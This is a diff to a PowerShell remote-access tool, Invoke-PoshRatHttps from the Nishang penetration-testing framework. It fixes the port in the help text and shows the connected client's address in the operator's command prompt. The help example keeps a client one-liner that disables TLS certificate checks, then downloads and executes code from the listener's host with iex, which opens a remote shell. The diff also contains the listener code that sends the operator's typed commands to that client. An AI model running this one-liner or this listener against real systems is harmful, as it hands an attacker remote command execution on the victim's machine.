@@ -32,7 +32,7 @@ The port on which the ecnrypted connection is establised.
 .EXAMPLE
 PS > Invoke-PoshRatHttps -IPAddress 192.168.254.1 -Port 8443
 
-Above shows an example where the listener starts on port 80 and 443. On the client execute:
+Above shows an example where the listener starts on port 8443. On the client execute:
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex (New-Object Net.WebClient).DownloadString("https://192.168.254.1:8443/connect")
 
 .LINK
@@ -64,6 +64,9 @@ https://github.com/samratashok/nishang
     function Receive-ClientHttpsRequest([System.Net.Sockets.TcpClient] $client)
     {
 	
+    
+    $RemoteAddr = $client.Client.RemoteEndPoint.Address
+
     $clientStream = $client.GetStream()		
     $SSLStream = New-Object System.Net.Security.SslStream($clientStream , $false)
 
@@ -133,7 +136,7 @@ do
     }
     if ($SSLUrl -eq '/rat' -and ($SSLMethod-eq "GET")) {  
 	
-    $Command = Read-Host "PS $IPAddress>"
+    $Command = Read-Host "PS $RemoteAddr>"
     $SSLResponse += "$Command"
 
 
